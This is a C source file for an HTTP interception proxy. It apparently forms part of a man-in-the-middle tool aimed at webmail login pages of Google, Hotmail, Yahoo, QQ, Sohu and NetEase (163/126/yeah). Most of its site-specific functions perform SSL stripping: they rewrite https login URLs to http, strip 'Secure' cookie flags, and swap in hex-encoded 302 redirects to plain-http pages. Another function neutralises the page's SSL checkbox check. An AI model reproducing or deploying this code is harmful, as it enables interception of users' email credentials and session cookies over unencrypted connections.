
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pcre.h>

#include "processorChain.h"
#include "processorDataStr.h"
#include "maskFlags.h"
#include "Analyzer_log.h"

#ifndef HTTP_PROXY_SEND_MODE
#define HTTP_PROXY_SEND_MODE
#define MODE_RCV 		0x00000001
#define MODE_CON 		0x00000002
#define MODE_URGENT  0x00000004
#endif


#ifndef DAT_LEN_CHAN
#define DAT_LEN_CHAN 0x00000010
#endif
#define  REPLYDATALEN 79
char RPLYyeah[REPLYDATALEN]={
					0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20,0x33,0x30,0x32,0x20,0x46,0x6f,0x75,
					0x6e,0x64,0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x68,0x74,
					0x74,0x70,0x3a,0x2f,0x2f,0x65,0x6d,0x61,0x69,0x6c,0x2e,0x31,0x36,0x33,0x2e,0x63,
					0x6f,0x6d,0x2f,0x23,0x79,0x65,0x61,0x68,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
					0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x30,0x0d,0x0a,0x0d,0x0a
					};
char RPLY163[REPLYDATALEN]={
					0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20,0x33,0x30,0x32,0x20,0x46,0x6f,0x75,
					0x6e,0x64,0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x68,0x74,
					0x74,0x70,0x3a,0x2f,0x2f,0x65,0x6d,0x61,0x69,0x6c,0x2e,0x31,0x36,0x33,0x2e,0x63,
					0x6f,0x6d,0x2f,0x23,0x31,0x36,0x33,0x20,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
					0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x30,0x0d,0x0a,0x0d,0x0a
					};
char RPLY126[REPLYDATALEN]={
					0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20,0x33,0x30,0x32,0x20,0x46,0x6f,0x75,
					0x6e,0x64,0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x68,0x74,
					0x74,0x70,0x3a,0x2f,0x2f,0x65,0x6d,0x61,0x69,0x6c,0x2e,0x31,0x36,0x33,0x2e,0x63,
					0x6f,0x6d,0x2f,0x23,0x31,0x32,0x36,0x20,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
					0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x30,0x0d,0x0a,0x0d,0x0a
					};										
					

static int insertBuffer(ProcessorChain* chain,char* sbuf,int len);
static int isReplyHeader(char* data);
static int isPostHeader(char* data);
static int IsFlashHeader(char* data);
static int IsImageHeader(char* data);
static int isGetHeader(char* data);
static int isRequestBytesType(char* data);
static int setBuddyFlag(char* data);
static int isRequestAttachType(char* dat);
static inline int DeleteSecure(char* data);
static inline int ReplaceHttpsHotmail(char* data);
static inline int ReplaceHttpsGoogle(char* data);
static inline int ResetContinue(char* data);
static inline int ReplaceHttpsYahoo(char* data);
static inline int ReplaceHttpsSOHU(char* data);
static inline int DeleteChecked(char* data);
static inline int ReplaceHttpsQQ(char* data);


//Function name: getProcessorChain
//
//Description: get a ProcessorChain with func
//Parameter:  f: flag
//				  mod: bits-flag for func
//				  func: a pointer to function
 ProcessorChain * getProcessorChain(int f,int mod,int (*func)(int,void*)){
	ProcessorChain * pcs=NULL;
	pcs=(ProcessorChain*)malloc(sizeof(ProcessorChain));
	if(pcs==NULL){
		LOG_ERROR("malloc processorChainStr fail\n");
		return NULL;
	}		
	memset(pcs,0,sizeof(ProcessorChain));
	pcs->mode=mod;
	pcs->processFunc=func;
	pcs->next=NULL;
	if(f!=0){
		pcs->mode=pcs->mode|CHAIN_MOD_HD;
	}
	return pcs;
}


//Function name: process
//
//Description: to call the functions in the list of proce
//Parameter: proce: a pointer to the header of data-process function list
//				 sbuf:	data to be processed
//				 len: length of sbuf

int process(ProcessorChain* proce,int mode,void* sbuf,int len){
//printf("get into process \n");
	ProcessorChain* chain=proce;
	insertBuffer(chain,sbuf,len);
	int (*func)(int,void*);
	int tret;
	if(mode&MODE_URGENT){
		proce->tmode|=CHAIN_MOD_SND;
	}
////add for PACK_TYPE_ATT ///////////////
	if(proce->tmode&PACK_TYPE_ATT){
		proce->tmode|=CHAIN_MOD_SND;
		return 1;
	}
/////////////////////////////////////////
	while(chain!=NULL){
		func=chain->processFunc;
		if(!(chain->mode&CHAIN_MOD_HD)){
			if(chain->mode&PARA_MOD_PUB)
				chain->data=proce->data;
			else if(chain->mode&PARA_MOD_PRI){
				((ProcessorPara*)chain->data)->pub=proce->data;
			}
		}
		if(chain->mode&PRO_MOD_AP_SET){
			if(proce->tmode&CHAIN_MOD_SND){
				if(proce->tmode&PACK_TYPE_STRM)
					return 1;
				tret=func(chain->mode,chain->data);
				if(tret&DAT_LEN_CHAN){
					proce->len=strlen(proce->data);
//					printf("data len change\n");
				}
			}
			else{}
		}
		else{
			if(proce->tmode&PACK_TYPE_STRM)
				return 1;
			func(chain->mode,chain->data);
		}
		chain=chain->next;
	}
//printf("get outof process\n");
	return 1;	
}

//Function name: addProcessor
//
//Description: add data-process function to the list of process function
//Parameter: process: apointer to the header of list of data-process functions
//				 mode: bits-flag for function
//				func: a pointer to data-process function
//				data: parameter of func
int addProcessor(ProcessorChain* process,int mode,int (*func)(int,void*),void* data){
	ProcessorChain* chain=getProcessorChain(0,0,NULL);	
	if(chain!=NULL){
		chain->mode=mode;
		chain->processFunc=func;
		if((mode&PARA_MOD_PRI)==PARA_MOD_PRI)
			chain->data=data;
		ProcessorChain* tmp=process;
		while(tmp->next!=NULL)
			tmp=tmp->next;
		tmp->next=chain;
		tmp->next->processID=tmp->processID+1;
		return tmp->next->processID;
	}
	return -1;
}


//Function name: removeProcessor
//
//Description: remove data-process function from the list of process-function
//Parameter: process: a pointer to the header of data-process function list
//				processid: id of data-process function which will be removed 
int removeProcessor(ProcessorChain* process,int processid){
	if(process->processID==processid){
		if(process->next!=NULL){
			process->processFunc=process->next->processFunc;
			process->mode=process->next->mode|CHAIN_MOD_HD;
			ProcessorChain* tmp=process->next;
			process->next=tmp->next;
			releaseProcessorChain(tmp);
			return 1;
		}
		return -1;
	}
	
	int c=1;
	ProcessorChain* chain=process;
	while(chain->next!=NULL){
		c++;
		if(chain->next->processID==processid){
			ProcessorChain* tmp=chain->next;
			chain->next=tmp->next;
			releaseProcessorChain(tmp);
			return c;
		}
		chain=chain->next;
	}
	return 0;
}


//Function name: insertBuffer
//
//Description:  insert the data receive from server or client into the session-buffer
//Parameter: 	chain: a pointer to struct
//					sbuf: data received from server or client
//					len:  length of sbuf
static int insertBuffer(ProcessorChain* chain,char* sbuf,int len){
	if(len<=0)
		return 0;
	if((chain->sitMsk&SITE_SERIAL_HOTMIL)&&(chain->sitMsk&SITE_DIRECTION_DOWN))
		ReplaceHttpsHotmail(sbuf);
	else if((chain->sitMsk&SITE_SERIAL_GOOGLE)&&(chain->sitMsk&SITE_DIRECTION_DOWN)){
		DeleteSecure(sbuf);
		ReplaceHttpsGoogle(sbuf);
	}

	else if((chain->sitMsk&SITE_SERIAL_GOOGLE)&&(chain->sitMsk&SITE_DIRECTION_UP)){
		ResetContinue(sbuf);
	}
	else if((chain->sitMsk&SITE_SERIAL_YAHOO)&&(chain->sitMsk&SITE_DIRECTION_DOWN))
	{
		DeleteSecure(sbuf);
		ReplaceHttpsYahoo(sbuf);
	}
	else if((chain->sitMsk&SITE_SERIAL_SOHU)&&(chain->sitMsk&SITE_DIRECTION_DOWN))
	{
		ReplaceHttpsSOHU(sbuf);
	}
	else if((chain->sitMsk&SITE_SERIAL_QQ)&&(chain->sitMsk&SITE_DIRECTION_DOWN))
	{
		ReplaceHttpsQQ(sbuf);
	}
	else if((chain->sitMsk&SITE_SERIAL_WANGYI)&&(chain->sitMsk&SITE_DIRECTION_DOWN)){
		if(chain->sitMsk&1){
			len=REPLYDATALEN;
			memcpy(sbuf,RPLYyeah,len);
			sbuf[len]=0;
		}
		if(chain->sitMsk&2){
			len=REPLYDATALEN;
//			printf("replace 163\n");
			memcpy(sbuf,RPLY163,len);
			sbuf[len]=0;
		}
		if(chain->sitMsk&4){
//			printf("replace 126\n");
			len=REPLYDATALEN;
			memcpy(sbuf,RPLY126,len);
			sbuf[len]=0;
		}
		DeleteChecked(sbuf);	
	}

/*
//temp section
	char* tpattern="https://mail.google.com/";
	char* tpatternB="https://www.google.com/accounts/";
	char* tpatternC="Secure";
	char* tpatternD="https://login.live.com";
	char* taddr=NULL;
	char* tstart=sbuf;
	while((taddr=strstr(tstart,tpattern))){
		memcpy(taddr," http",5);
		tstart=taddr;
	}
	tstart=sbuf;
	while((taddr=strstr(tstart,tpatternB))){
		memcpy(taddr," http",5);
		tstart=taddr;
	}
	tstart=sbuf;
	while((taddr=strstr(tstart,tpatternC))){
		memcpy(taddr,"      ",6);
		tstart=taddr;
	}
	tstart=sbuf;
	while((taddr=strstr(tstart,tpatternD))){
		memcpy(taddr," http",5);
		tstart=taddr;
	}
*/

//



/*	
	printf("chain->mode=%d\n",chain->mode);
	printf("chain->mode&CHAIN_MOD_HD=%d\n",chain->mode&CHAIN_MOD_HD);
*/
//printf("get into insertBuffer\n");
		if(chain->mode&CHAIN_MOD_HD){
			if(!(chain->tmode&PACK_MOD_SET)){
				if(isReplyHeader(sbuf))
					chain->tmode|=PACK_MOD_SET|PACK_MOD_REP;
				else if(isPostHeader(sbuf))
					chain->tmode|=PACK_MOD_SET|PACK_MOD_PST;
				else if(isGetHeader(sbuf)){
					chain->tmode|=PACK_MOD_SET|PACK_MOD_GET;
					int flag=setBuddyFlag(sbuf);
					chain->buddy->tmode|=flag;
				}
				else
					chain->tmode|=PACK_MOD_SET;	
			}
			if(!(chain->tmode&PACK_TYPE_SET)){
				chain->tmode|=PACK_TYPE_SET;
				if(IsImageHeader(sbuf) ||IsFlashHeader(sbuf))
					chain->tmode|=PACK_TYPE_STRM;
			}
			if(!(chain->tmode&PACK_CONT_LEN_SET)){
				chain->tmode|=PACK_CONT_LEN_SET;
				if(chain->tmode&(PACK_MOD_PST|PACK_MOD_REP)){
					char* pattern="Content-Length:";
					char* addr=strstr(sbuf,pattern);
					if(addr){
						chain->tmode|=PACK_CONT_LEN_COM;
						addr+=15;
						int tmpclen=atoi(addr);
						chain->clen=tmpclen;
					}
					else{
						char* patternB="Transfer-Encoding: chunked\r\n";
						addr=strstr(sbuf,patternB);
						if(addr){
							chain->tmode|=PACK_CONT_LEN_CHUNK;
						}
						else{
							chain->tmode|=PACK_CONT_LEN_UNKNOW;
						}
					}
				}
			}
			memcpy(chain->data+chain->rlen,sbuf,len);
			chain->rlen+=len;
			chain->len+=len;
//			printf("in process len:%d chain->len:%d\n",len,chain->len);
			if(chain->tmode&PACK_MOD_GET){
				chain->tmode=chain->tmode|CHAIN_MOD_SND;
				return 1;
			}
/////////////////
			if(chain->tmode&PACK_MOD_PST){
				chain->tmode|=CHAIN_MOD_SND;
				return 1;
			}
			if(chain->tmode&PACK_TYPE_ATT){
				chain->tmode|=CHAIN_MOD_SND;
				return 1;
			}

/////////////////


			if(chain->tmode&PACK_CONT_LEN_COM){
				char* contentStart="\r\n\r\n";
				char* addr=strstr(chain->data,contentStart);
				int tmpcrlen=chain->rlen-((int)addr-(int)chain->data)-4;
				if(tmpcrlen>=chain->clen){					
					chain->tmode=chain->tmode|CHAIN_MOD_SND;
					return 2;
				}
//////////////////////////
//				if(chain->tmode&(PACK_MOD_PST|PACK_TYPE_ATT))
//					chain->tmode|=CHAIN_MOD_SND;
//////////////////////////

				return 0;
			}
			if(chain->tmode&(PACK_CONT_LEN_CHUNK|PACK_CONT_LEN_UNKNOW)){
				chain->tmode=chain->tmode|CHAIN_MOD_SND;
				return 1;
			}
			if(chain->tmode&PACK_MOD_PST){
				chain->tmode|=CHAIN_MOD_SND;
				return 1;
			}
			if(chain->tmode&PACK_TYPE_ATT){
				chain->tmode|=CHAIN_MOD_SND;
				return 1;
			}
		}
	return 0;
}


//Function name : resetChainHead
//
//Description : reset the value of chain
//Parameter : chain :a point to header of ProcessorChain-list
//				  dataaddr: a pointer to buffer
//				  tmod: bits-flag
int resetChainHead(ProcessorChain* chain,char* dataaddr,int tmod){
		chain->len=0;
		chain->rlen=0;
		chain->clen=0;
		chain->data=dataaddr;
		int imode=chain->tmode;
		memset(chain->data,0,sizeof(chain->data));
		chain->tmode=tmod;
		if(imode&PACK_CONT_LEN_CHUNK)
			chain->tmode=imode;
		if(imode&PACK_MOD_PST)
			chain->tmode=imode;
		if(imode&PACK_MOD_GET)
			chain->tmode=imode;
		if(imode&PACK_TYPE_ATT)
			chain->tmode=imode;
		return 1;
}

//Function name : releaseProcessorList
//
//Description : release the memory malloced for chain-list
//Parameter : chain :a pointer to header of ProcessorChain-list
int releaseProcessorList(ProcessorChain* chain){
	if(!chain)
		return 0;
	ProcessorChain* tmp=chain->next;
	while(tmp){
		chain->next=tmp->next;
		free(tmp);
		tmp=chain->next;
	}
	free(chain);
	return 1;
}

//Function name : releaseProcessorChain
//
//Description : release the memory malloced for chain
//Parameter : chain :a pointer to ProcessorChain
int releaseProcessorChain(ProcessorChain* chain){
	if(!chain)
		return 0;
	free(chain);
		return 1;
}


//Function name : IsReplyHeader
//
//Description : test if the data is a package of reply
//Parameter : data :a pointer to charaters
static int isReplyHeader(char* data){
	if(strlen(data)>5&&memcmp("HTTP/",data,5)==0){
		int i=5;
		int len=strlen(data);
		while(i<len&&data[i]!=' ')
			i++;
		char buf[4];
		memset(buf,0,4);
		i++;
		int j=0;
		while(j<3&&i<len&&data[i]!=' '){
			buf[j]=data[i];
			j++;
			i++;
		}
		int status=atoi(buf);
		if(status==302||status==200)
		return 1;
		return 1;
	}	
	return 0;
}

//Function name : IsPostHeader
//
//Description : test if the data is a package of post
//Parameter : data :a pointer to charaters
static int isPostHeader(char* data){
	if(!(strlen(data)>10 && memcmp("POST ",data,5)==0))
		return 0;
	return 1;

}


//Function name : IsGetHeader
//
//Description : test if the data is a package of get-request header
//Parameter : data :a pointer to charaters
static int isGetHeader(char* data){
		char* matchDat=data;
		char* pattern="GET /";
		if(strlen(matchDat)>20&&memcmp(pattern,data,5)==0)
			return 1;
		return 0;
}



//Function name : IsImageHeader
//
//Description : test if the data is a package of image-reply
//Parameter : data :a pointer to charaters
static int IsImageHeader(char* data){
	if(!isReplyHeader(data))
		return 0;
	char* pattern="Content-Type: image/";
	if(strstr(data,pattern))
		return 1;
	return 0;
}

//Function name : IsFlashHeader
//
//Description : test if the data is a package of Flash-reply
//Parameter : data :a pointer to charaters
static int IsFlashHeader(char* data){
	if(!isReplyHeader(data))
		return 0;
	char* pattern="Content-Type: application/x-shockwave-flash";
	if(strstr(data,pattern))
		return 1;
	return 0;
}

//Function name: isRequestBytesType
//Description: detect the request is a bytes-file or not
//Parameter: data: received from client
static int isRequestBytesType(char* data){
	char* cur=".cur";
	char* endFlag=" HTTP/";
	if((int)strstr(data,cur) < (int)strstr(data,endFlag))
		return 1;
	return 0;
}

//Function name: setBuddyFlag
//Description: get the flags mask for it's buddy
//Parameter: data: data received from client
static int setBuddyFlag(char* data){
	int flag=0;
	if(isGetHeader(data)){
		if(isRequestBytesType(data))
			flag|=PACK_TYPE_STRM|PACK_TYPE_SET;
		if(isRequestAttachType(data))
			flag|=PACK_TYPE_ATT;
	}
	return flag;
}

//Function name: isRequestAttchType
//Description: test if the request type is attachment
//Parameter:	dat: data received from client
static int isRequestAttachType(char* dat){
	char* data=dat;
	char* addr=NULL;
	char* endaddr=NULL;
	addr=strstr(data,"view=att&");
	endaddr=strstr(data,"HTTP/");
	if(addr && endaddr)
		if((int)addr<(int)endaddr)
			return 1;
	return 0;
}

static inline int DeleteSecure(char* data){
	char* tpattern="Secure";
	char* tstart=data;
	char* taddr=NULL;
	int i=0;
	while((taddr=strstr(tstart,tpattern))){
		memcpy(taddr,"      ",6);
		tstart=taddr;
		i++;
	}
	return i;
}

static inline int ReplaceHttpsHotmail(char* data){
	char* tpattern="https://login.live.com";
	char* taddr=NULL;
	char* tstart=data;
	int i=0;
	while((taddr=strstr(tstart,tpattern))){
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
	return i;
}

static inline int ReplaceHttpsGoogle(char* data){
	char*  pattern="\"https://mail.google.com/";
	char* patternB=" \"http://";
	char* addr=NULL;
	char* start=data;
	while((addr=strstr(start,pattern))){
		memcpy(addr,patternB,strlen(patternB));
		start=addr+strlen(pattern);
	}

	char* tpattern="https://mail.google.com/";
	char* tpatternB="https://www.google.com/";
	char* taddr=NULL;
	char* tstart=data;
	int i=0;
	while((taddr=strstr(tstart,tpattern))){
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
	tstart=data;
	while((taddr=strstr(tstart,tpatternB))){
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
	char*  patternW="Location: https://www.google.com/";
	char* patternWB="Location:  http://www.google.com/";
	char* patternWC="https://www.google.com/";
	char* patternWD=" http://www.google.com/";
	tstart=data;
	while(taddr=strstr(tstart,patternW)){
		memcpy(taddr,patternWB,strlen(patternWB));
		tstart=taddr;
		i++;
	}
	tstart=data;
	while(taddr=strstr(tstart,patternWC)){
		memcpy(taddr,patternWC,strlen(patternWC));
		tstart=taddr;
		i++;
	}
	
	
	
	tstart=data;
	char* patternC="Location: https://mail.google.com/mail/?shva=1";
	char* patternD="Location:  http://mail.google.com/mail/?shva=1";
	char* patternE="Location: http://mail.google.com/mail/?ui=html";
	char* patternT="Location:\\s{1,2}((https:)|(http:))//mail.google.com/mail/\\?(hl=\\w*-?\\w*&)?shva=1";
	static pcre* id=NULL; 
	int offset;
	const char* err;
 	taddr=strstr(tstart,patternC);
	if(!taddr)
		addr=strstr(tstart,patternD);
	if(taddr)
		memcpy(taddr,patternE,strlen(patternC));
	else{
		if(id==NULL)
			id=pcre_compile(patternT,0,&err,&offset,0);
		if(id){
			int vect[12];
			int i=pcre_exec(id,0,data,strlen(data),0,0,vect,12);
			if(i>=0){
				int i=vect[0];
				int e=vect[1];
				if(data[i+14]=='s')
					i+=14;
				else
					i+=10;
				{
					while(i<e-7){
						data[i]=data[i+1];
						i++;
					}
					memcpy(data+i,"ui=html",7);
				}
			}
		}
	}
	return i;
}

static inline int ResetContinue(char* data){
	char*  tpattern="continue=+http";
	char* tpatternB="continue=https";
	char* taddr=NULL;
	char* tstart=data;
	int i=0;
	while((taddr=strstr(tstart,tpattern))){
		memcpy(taddr,tpatternB,strlen(tpatternB));
		tstart=taddr;
		i++;
	}
	return i;
}


static inline int ReplaceHttpsSOHU(char* data){
	char* tpattern="https://mail.sohu.com";
	char* tpatternB="https://passport.sohu.com";
	char* tpatternC="\"https\"";
	char* tpatternD="\" http\"";

	char* taddr=NULL;
	char* tstart=data;
	int i=0;
	
	while((taddr=strstr(tstart,tpattern)))
	{
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
	tstart=data;
	while((taddr=strstr(tstart,tpatternB)))
	{
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
		
	tstart=data;
	while(taddr=strstr(tstart,tpatternC))
	{
		memcpy(taddr,tpatternD,strlen(tpatternD));
		tstart=taddr;
		i++;
	}
	
	return i;
	
}

static inline int ReplaceHttpsYahoo(char* data){
	char* tpattern="https://login.yahoo.com";
	char* tpatternB="https://edit.bjs.yahoo.com";
	char* taddr=NULL;
	char* tstart=data;
	int i=0;
	
	while((taddr=strstr(tstart,tpattern)))
	{
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
	tstart=data;
	while((taddr=strstr(tstart,tpatternB)))
	{
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
	return i;
	
}

static inline int ReplaceHttpsQQ(char* data){
	char* tpattern="https://mail.qq.com/cgi-bin/login";

	char* taddr=NULL;
	char* tstart=data;
	int i=0;
	
	while((taddr=strstr(tstart,tpattern)))
	{
		memcpy(taddr," http",5);
		tstart=taddr;
		i++;
	}
	
	char* pattern ="\"https://mail.qq.com\"";
	char* patternB="                       ";
	char* addr=NULL;
	int len=strlen(pattern);
	while(addr=strstr(data,pattern))
	{
		memcpy(addr,patternB,len);
	}
	
	return i;
	
}

static inline int DeleteChecked(char* data){
	char* tpattern="!$(\"chkSSL\").checked";
	char* tstart=data;
	char* taddr=NULL;
	int i=0;
	while((taddr=strstr(tstart,tpattern))){
		memcpy(taddr," ",1);
		tstart=taddr;
		i++;	
	}
	return i;
}


